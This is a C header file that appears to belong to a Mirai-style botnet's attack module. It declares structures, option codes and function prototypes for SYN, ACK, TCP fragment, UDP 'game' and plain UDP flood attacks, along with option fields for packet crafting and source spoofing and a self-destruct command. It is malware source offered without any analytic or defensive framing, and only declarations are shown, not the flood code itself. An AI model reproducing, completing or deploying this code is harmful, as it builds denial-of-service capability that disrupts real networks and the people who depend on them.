#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   15
struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_SYN        0
#define ATK_VEC_ACK        1
#define ATK_VEC_USYN       2
#define ATK_VEC_TCPALL     3
#define ATK_VEC_TCPFRAG    4
#define ATK_VEC_ASYN       5
#define ATK_VEC_GAME       6
#define ATK_VEC_UDPPLAIN   7
#define ATK_VEC_STOP       8
#define ATK_VEC_DESTRUCT   9

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_DNS_HDR_ID      9
#define ATK_OPT_URG             11
#define ATK_OPT_ACK             12
#define ATK_OPT_PSH             13
#define ATK_OPT_RST             14
#define ATK_OPT_SYN             15
#define ATK_OPT_FIN             16
#define ATK_OPT_SEQRND          17
#define ATK_OPT_ACKRND          18
#define ATK_OPT_GRE_CONSTIP     19
#define ATK_OPT_SOURCE          25
struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
void attack_method_tcpsyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpusyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpall(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_asyn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpgame(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_misckill();
void attack_method_miscdestruct();

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
